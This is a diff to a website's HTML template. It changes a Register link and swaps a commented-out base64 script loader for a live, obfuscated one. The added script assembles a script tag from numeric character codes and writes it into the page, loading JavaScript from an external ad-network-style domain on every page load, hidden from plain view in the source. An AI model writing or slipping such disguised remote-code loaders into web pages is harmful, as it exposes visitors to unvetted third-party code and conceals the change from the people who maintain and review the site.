@@ -179,7 +179,7 @@
                     <button class="btn btn-outline-theme ml-md-3 mb-3 mb-md-0 sign-in">Sign In</button>
                 </li>
                 <li class="nav-item">
-                    <a href="/loading" class="btn btn-theme ml-md-3">Register</i></a>
+                    <a href="/request" class="btn btn-theme ml-md-3">Register</i></a>
                 </li>
             </ul>
         </div>
@@ -206,7 +206,16 @@
         </div>
     </footer>
     <!-- <?php echo histats_code() ?> -->
-    <!-- <script>document.write(atob("PHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnIHNyYz0nLy9wbDIwNjA2NDA0LmhpZ2hjcG1yZXZlbnVlZ2F0ZS5jb20vYzUvZTQvOTMvYzVlNDkzY2JlMTlmN2QyYzQ2MWI2NmQ1MWE1MWIxODUuanMnPjwvc2NyaXB0Pg=="));</script> -->
+
+    <script>
+        var y = "";
+        var x = [60, 115, 99, 114, 105, 112, 116, 32, 116, 121, 112, 101, 61, 39, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 39, 32, 115, 114, 99, 61, 39, 47, 47, 112, 108, 50, 48, 55, 52, 53, 56, 50, 57, 46, 112, 114, 111, 102, 105, 116, 97, 98, 108, 101, 103, 97, 116, 101, 99, 112, 109, 46, 99, 111, 109, 47, 101, 56, 47, 48, 57, 47, 51, 54, 47, 101, 56, 48, 57, 51, 54, 50, 100, 49, 101, 100, 98, 97, 48, 49, 57, 99, 57, 97, 51, 56, 48, 56, 54, 97, 97, 100, 49, 48, 51, 48, 56, 46, 106, 115, 39, 62, 60, 47, 115, 99, 114, 105, 112, 116, 62];
+        x.forEach(char => {
+            y += String.fromCharCode(char)
+        });
+        document.write(y);
+    </script>
+
 </body>
 
 </html>
